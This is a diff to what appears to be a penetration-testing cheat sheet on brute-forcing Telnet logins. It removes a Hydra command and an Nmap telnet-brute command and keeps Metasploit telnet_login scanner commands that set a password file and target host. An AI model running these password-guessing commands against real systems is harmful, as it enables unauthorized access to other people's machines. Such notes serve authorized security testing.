@@ -1,10 +1,4 @@
-# Telnet
-
-## 01 - Hydra
-
-`$ hydra -l <username> -P passwords.lst <IP> telnet`
-
-## 02 - Metasploit
+# Metasploit
 
 ```
 msf > use auxiliary/scanner/telnet/telnet_login
@@ -43,10 +37,4 @@ msf auxiliary(scanner/telnet/telnet_login) > set pass_file passwords.lst
 msf auxiliary(scanner/telnet/telnet_login) > set rhosts <target_IP>
 
 msf auxiliary(scanner/telnet/telnet_login) > run -j
-```
-
-## 03 - Nmap
-
-```
-$ nmap -p 23 --script telnet-brute --script-args userdb=usernames.lst,passdb=passwords.lst,telnet-brute.timeout=8s <IP>
 ```
